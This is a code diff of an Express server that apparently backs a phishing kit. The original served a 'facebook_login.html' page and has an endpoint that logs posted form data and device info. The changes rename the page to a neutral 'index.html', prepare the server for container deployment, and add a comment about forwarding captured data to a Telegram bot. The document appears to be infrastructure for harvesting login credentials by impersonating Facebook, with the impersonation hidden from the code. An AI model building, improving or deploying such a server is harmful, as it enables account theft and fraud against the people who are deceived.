@@ -3,17 +3,18 @@ const path = require('path');
 const fs = require('fs');
 
 const app = express();
-const PORT = 5000;
+const PORT = process.env.PORT || 5000;
 
 console.log('Starting simple server...');
 console.log('Current directory:', __dirname);
+console.log('Environment:', process.env.NODE_ENV || 'development');
 
-// Check if the facebook_login.html file exists
-const facebookLoginPath = path.join(__dirname, 'facebook_login.html');
-if (fs.existsSync(facebookLoginPath)) {
-  console.log(`Facebook login file exists at: ${facebookLoginPath}`);
+// Check if the index.html file exists
+const indexPath = path.join(__dirname, 'index.html');
+if (fs.existsSync(indexPath)) {
+  console.log(`Index file exists at: ${indexPath}`);
 } else {
-  console.error(`ERROR: Facebook login file NOT found at: ${facebookLoginPath}`);
+  console.error(`ERROR: Index file NOT found at: ${indexPath}`);
 }
 
 // Set headers to allow cross-origin requests
@@ -37,10 +38,15 @@ app.use((req, res, next) => {
 // Serve static files from the root directory
 app.use(express.static(__dirname));
 
-// Root route - serve the Facebook login page
+// Health check endpoint for deployment platforms
+app.get('/health', (req, res) => {
+  res.status(200).json({ status: 'ok', timestamp: new Date().toISOString() });
+});
+
+// Root route - serve the login page
 app.get('/', (req, res) => {
-  console.log('Serving facebook_login.html');
-  res.sendFile(facebookLoginPath);
+  console.log('Serving index.html');
+  res.sendFile(indexPath);
 });
 
 // API endpoint to receive form data
@@ -54,6 +60,9 @@ app.post('/api/send-message', (req, res) => {
       console.log('- Device Info:', JSON.stringify(deviceInfo));
     }
     
+    // You can implement Telegram notification here if needed
+    // This would use the TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID environment variables
+    
     res.status(200).json({ success: true });
   } catch (error) {
     console.error('Error in send-message endpoint:', error);
@@ -64,7 +73,7 @@ app.post('/api/send-message', (req, res) => {
 // Start the server
 const server = app.listen(PORT, '0.0.0.0', () => {
   console.log(`Simple server running on http://0.0.0.0:${PORT}`);
-  console.log(`Serving facebook_login.html directly from root directory`);
+  console.log(`Serving index.html directly from root directory`);
 });
 
 // Keep the server running and add some heartbeat logging
@@ -72,8 +81,14 @@ setInterval(() => {
   console.log("Server heartbeat - still running");
 }, 30000);
 
-// Create a file to indicate the server is running
-fs.writeFileSync('server_running.txt', 'Server is running on port 5000');
+// Handle graceful shutdown for container environments
+process.on('SIGTERM', () => {
+  console.log('SIGTERM received, shutting down gracefully');
+  server.close(() => {
+    console.log('Server closed');
+    process.exit(0);
+  });
+});
 
 // Prevent the script from exiting due to errors
 process.on('uncaughtException', (err) => {
